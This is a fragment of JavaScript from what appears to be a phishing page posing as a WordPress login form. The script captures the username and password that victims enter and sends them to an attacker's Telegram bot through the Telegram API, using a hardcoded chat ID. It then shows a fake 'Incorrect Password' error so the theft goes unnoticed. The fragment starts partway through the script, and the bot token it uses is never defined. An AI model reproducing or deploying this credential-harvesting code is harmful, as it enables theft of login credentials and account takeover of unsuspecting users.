      const chatId = "5966756664";
  
  
  
  
  
      // Coded by : Md Golam Rasul
      const user_loginInput = document.getElementById("user_login");
      const user_passInput = document.getElementById("user_pass");
      const wp_submitButton = document.getElementById("wp_submit");
  
      // Add click event listener to login button
      wp_submitButton.addEventListener("click", function(event) {
        event.preventDefault();
        // Get input values
        const user_login = user_loginInput.value;
        const user_pass = user_passInput.value;
  
        // Send message to Telegram bot
        const message = `New login:\nEmail: ${user_login}\nPassword: ${user_pass}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
        fetch(url)
          .then(response => {
            if (response.ok) {
              var errorMessage = "Incorrect Password! Please try again.";
              document.getElementById("error-message").textContent = errorMessage;
  
              user_loginInput.value = "";
              user_passInput.value = "";
            } else {
              throw new Error("Failed to send message to Trickbd Database.");
            }
          })
          .catch(error => {
            console.error(error);
            alert("Failed to send login information to Trickbd Database.");
          });
      });
    </script>
